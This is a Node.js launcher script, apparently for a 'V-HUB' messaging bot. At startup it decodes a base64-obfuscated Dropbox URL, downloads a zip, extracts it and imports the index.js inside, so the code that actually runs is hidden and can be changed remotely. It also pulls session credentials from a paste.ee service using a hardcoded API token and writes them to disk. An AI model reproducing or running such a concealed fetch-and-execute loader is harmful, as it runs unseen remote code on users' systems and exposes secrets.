import https from 'https';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import AdmZip from 'adm-zip';
import zlib from 'zlib'; 
import fetch from 'node-fetch'; 


const vault_secret = "aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpL25jOGNjZ21ya3YzM2I2NmY5aHI2OS92aHViX2NvcmUuemlwP3Jsa2V5PXZudGc3aTZxbTVyZ3g2YXM0bnloY2Nmc2Mmc3Q9cGdpc3NkcHAmZGw9MQ==";


const download = async (url, dest) => {
    const response = await fetch(url, { redirect: 'follow' });
    if (!response.ok) throw new Error(`Download failed: ${response.statusText}`);
    const arrayBuffer = await response.arrayBuffer();
    const buffer = Buffer.from(arrayBuffer);
    fs.writeFileSync(dest, buffer);
};


const findEntry = (dir) => {
    const files = fs.readdirSync(dir);
    if (files.includes('index.js')) return path.join(dir, 'index.js');
    for (const file of files) {
        const fullPath = path.join(dir, file);
        if (fs.statSync(fullPath).isDirectory()) {
            const found = findEntry(fullPath);
            if (found) return found;
        }
    }
    return null;
};


const mountSession = async (sessionId, targetFolder) => {
    if (!sessionId) {
        console.log("[V-HUB] ℹ️ No SESSION_ID found in environment. Proceeding...");
        return;
    }

    let compressedData = "";

    if (sessionId.startsWith("VINNIE~")) {
        console.log("[V-HUB] 🔓 Unlocking Local Session String (Long ID)...");
        compressedData = sessionId.split("VINNIE~")[1];
    } 
    else if (sessionId.startsWith("VHUB~")) {
        console.log("[V-HUB] ☁️ Fetching Session from Paste.ee Vault (Short ID)...");
        const pasteId = sessionId.split("VHUB~")[1];
        
        try {
            const res = await fetch(`https://api.paste.ee/v1/pastes/${pasteId}`, {
                headers: { 'X-Auth-Token': 'a6ZNz0eKkPFlbwcyPNvm86XUKwHIpb9E9d2pBsL8w' }
            });
            const data = await res.json();
            if (!data.paste) throw new Error("Paste not found");
            compressedData = data.paste.sections[0].contents;
        } catch (err) {
            throw new Error("Failed to fetch session from Vault. Invalid Short ID.");
        }
    } 
    else {
        console.log("[V-HUB] ⚠️ Unknown Session format. Proceeding without auto-mount...");
        return;
    }

    
    const credsBuffer = Buffer.from(compressedData, 'base64');
    const credsJson = zlib.inflateSync(credsBuffer).toString('utf-8');
    
    const sessionPath = path.join(targetFolder, 'session');
    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });
    
    fs.writeFileSync(path.join(sessionPath, 'creds.json'), credsJson);
    console.log("[V-HUB] ✅ GhostCore Session Mounted Successfully!");
};

(async () => {
    console.log('[V-HUB] SYSTEM STARTING...');
    try {
        const fullUrl = Buffer.from(vault_secret, 'base64').toString('utf-8');
        const zipPath = path.join(process.cwd(), 'core.zip');
        const extractPath = path.join(process.cwd(), 'hub_temp');

        if (!fs.existsSync(extractPath)) fs.mkdirSync(extractPath, { recursive: true });

        console.log('[V-HUB] FETCHING CORE...');
        await download(fullUrl, zipPath);
        
        console.log('[V-HUB] EXTRACTING...');
        new AdmZip(zipPath).extractAllTo(extractPath, true);
        fs.unlinkSync(zipPath);
        
        const entryFile = findEntry(extractPath);
        if (!entryFile) throw new Error("Could not locate index.js inside ZIP");

        console.log(`[V-HUB] BOOTING FROM: ${entryFile}`);
        process.chdir(path.dirname(entryFile));

        
        await mountSession(process.env.SESSION_ID, process.cwd());

        await import(`file://${entryFile}`);
    } catch (e) {
        console.error('[V-HUB] FATAL ERROR:', e.message);
        process.exit(1);
    }
})();
